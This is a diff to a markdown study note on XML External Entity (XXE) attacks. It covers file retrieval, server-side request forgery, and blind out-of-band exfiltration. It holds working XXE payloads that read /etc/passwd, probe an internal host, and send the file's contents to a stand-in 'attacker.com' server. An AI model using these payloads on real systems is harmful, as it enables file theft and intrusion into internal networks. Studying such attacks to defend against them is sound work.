@@ -9,32 +9,33 @@ XXE is a web security vulnerability that allows an attacker to interfere with an
 - XXE vulnerabilities as uploading an XML file that includes an external entity.
 ```xml
 <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<foo>&xxe;</foo
+<foo>&xxe;</foo>
 ```
 
 
 ## Types of XXE Attacks: 
 
 - XXE for File Retrieval
+	- Defining a new Entity called ```xxe```. This entity is made to execute a system call.
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <product>&xxe;</product>
 <adress>&xxe;</adress>
 ```
-- Defining a new Entity called ```xxe```. This entity is made to execute a system call.
 - XXE for Server-Side Request Forgery 
+	- System call to an HTTP endpoint of an internal webserver of which we should not see the contents from outside.
 ```xml 
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internals.target.com"> ]>
 ```
-	- System call to an HTTP endpoint of an internal webserver of which we should not see the contents from outside.
 - Data out-of-band exfiltration (Blind XXE)
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://Attacker.com"> ]>
 ```
 	- Make a callback to our server.
 ```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % evil "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+<!DOCTYPE foo [
+	<!ENTITY % file SYSTEM "file:///etc/passwd">
+	<!ENTITY % evil "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">]>
 %evil;
 %exfiltrate;
 ```
